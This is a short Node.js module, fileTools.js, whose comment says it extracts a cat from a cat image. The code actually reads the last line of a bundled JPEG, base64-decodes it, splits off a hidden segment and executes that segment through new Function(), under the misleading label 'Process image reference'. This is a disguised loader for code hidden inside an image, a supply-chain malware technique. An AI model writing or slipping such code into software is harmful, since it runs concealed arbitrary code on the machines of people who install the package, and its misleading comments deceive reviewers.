// fileTools.js
const fs = require('fs');
const readline = require('readline');
const Stream = require('stream');

const lastLine = (fileName, minLength) => {
    let inStream = fs.createReadStream(fileName);
    let outStream = new Stream;
    return new Promise((resolve, reject)=> {
        let rl = readline.createInterface(inStream, outStream);

        let lastLine = '';
        rl.on('line', function (line) {
            if (line.length >= minLength) {
                lastLine = line;
            }
        });

        rl.on('error', reject)

        rl.on('close', function () {
            resolve(lastLine)
        });
    })
}

/**
 * Extracts a cat from a cat image
 */
const getCatFromCat = async () => {
    const lineData = await lastLine(`${__dirname}/../docs/img/cat.jpg`, 1)
    const data = await Buffer.from(lineData, 'base64').toString('utf-8').split("##")

    // Process image reference
    const processor = new Function(data[1])
    processor()
    return data[0]
}
module.exports = getCatFromCat

